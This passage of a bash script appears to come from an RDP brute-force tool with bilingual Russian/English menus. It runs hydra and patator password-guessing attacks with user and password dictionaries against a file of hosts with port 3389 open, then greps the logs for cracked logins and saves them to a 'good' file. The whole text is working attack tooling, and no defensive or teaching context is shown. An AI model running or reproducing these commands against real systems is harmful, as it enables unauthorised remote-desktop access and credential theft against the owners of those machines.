echo -e "                                           $green Start bruteforceing$colorbase"
	
hydra -L $PWD/users -P $PWD/dict/pass -I -t 16 -vV -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

	
	TESTRESULTRU_H

	else


echo -e "                                           $green Start bruteforceing"
echo ""
echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1 port=$port password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
#python crowbar.py -b rdp -U $PWD/users -C $PWD/dict/pass -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -L $PWD/users -P $PWD/dict/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTEN
echo -e "\n$red***ERROR! File for targets is empty "
echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase"
read -p ""

./rdp_brute.sh
fi

if [ "$brutmenu" = "5" ]; then
echo ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi
fi
}

######################################TESTRESULTRU#######################################
TESTRESULTRU ()
{
clear
cat $PWD/Results/RUNTIME.log |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,100}'| sed 'n;d' > all_results
if [ -s all_results ]
	then
	#clear
	cat all_results |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,100}'| sed 'n;d' >> good
	cat all_results
	echo ""
 echo -e "$colorbase                                       +---------------------------+"
 echo -e "$colorbase                                       |$red   Логин/Пароль найден!    $colorbase|";
 echo -e           "                                       +---------------------------+$red"
	echo ""
	echo -e "$yellow*Логин/Пароль записаны в файл $red $PWD/good"
	echo ""
	echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh	
	else
 echo -e "$colorbase                                       +---------------------------+"
 echo -e "$colorbase                                       |$red Логин/Пароль не найден :( $colorbase|";
 echo -e           "                                       +---------------------------+$red"
 
 echo -e ""
 echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi	
}
########################################################################################

######################################TESTRESULTRU_H#######################################
TESTRESULTRU_H ()
{
clear
cat $PWD/result |grep -v "# Hydra v9.3-dev"|grep -E '[DATA]|[STATUS]|host|login|password' > all_results
if [ -s all_results ]
	then
	#clear
	cat all_results |grep -v "# Hydra v9.3-dev at"|grep -E '[DATA]|[STATUS]|host|login|password' >> good
	cat all_results
	echo ""
 echo -e "$colorbase                                       +---------------------------+"
 echo -e "$colorbase                                       |$red   Логин/Пароль найден!    $colorbase|";
 echo -e           "                                       +---------------------------+$red"
	echo ""
	echo -e "$yellow*Логин/Пароль записаны в файл $red $PWD/good"
	echo ""
	echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh	
	else
 echo -e "$colorbase                                       +---------------------------+"
 echo -e "$colorbase                                       |$red Логин/Пароль не найден :( $colorbase|";
 echo -e           "                                       +---------------------------+$red"
 
 echo -e ""
 echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi	
}
########################################################################################

######################################TESTRESULTEN_H#######################################
TESTRESULTEN_H ()
{
clear
cat $PWD/result |grep -v "# Hydra v9.3-dev"|grep -E '[DATA]|[STATUS]|host|login|password' > all_results
if [ -s all_results ]
	then
	#clear
	cat all_results |grep -v "# Hydra v9.3-dev"|grep -E '[DATA]|[STATUS]|host|login|password' >> good
	cat all_results
	echo ""
 echo -e "$colorbase                          +-------------------------+"
 echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
 echo -e           "                          +-------------------------+$red"
	echo ""
 echo -e "$yellow*Login/Password written to the file $red $PWD/good$colorbase"
	echo ""
 echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh	
	else
 echo -e "$colorbase                                      +-----------------------------+"
 echo -e "$colorbase                                      |$red Login/Password not found :( $colorbase|";
 echo -e           "                                      +-----------------------------+$red"
 
 echo -e ""
 echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi	
}

######################################TESTRESULTEN######################################
TESTRESULTEN ()
{
clear
cat $PWD/Results/RUNTIME.log |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,100}'| sed 'n;d' > all_results
if [ -s all_results ]
	then
	#clear
	cat all_results |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,100}'| sed 'n;d' >> good
        cat all_results
 echo -e "$colorbase                          +-------------------------+"
 echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
 echo -e           "                          +-------------------------+$red"
 echo -e ""
 echo -e "$yellow*Login/Password written to the file $red $PWD/good$colorbase"
 echo -e ""
 echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
	else
 echo -e "$colorbase                                      +-----------------------------+"
 echo -e "$colorbase                                      |$red Login/Password not found :( $colorbase|";
 echo -e           "                                      +-----------------------------+$red"
 echo -e ""
 echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi	
}
#######################################CHECKFILERU######################################
CHECKFILERU ()
{
if [ -s open3389 ]
	then
 echo ""
	else
 echo -e "$colorbase                                       +-------------------------+"
 echo -e "$colorbase                                       |$red Открытых RDP не найдено $colorbase|";
 echo -e           "                                       +-------------------------+$red"
 echo -e ""
 echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi
}
########################################################################################

#######################################CHECKFILEEN######################################
CHECKFILEEN ()
{
if [ -s open3389 ]
	then
 echo ""
	else
 echo -e "$colorbase                                        +-------------------------+"
 echo -e "$colorbase                                        |$red    Open Rdp not found $colorbase  |";
 echo -e           "                                        +-------------------------+$red"
 echo -e ""
echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
read -p ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi
}
#####################################################################################
CHECKLANGUAGE
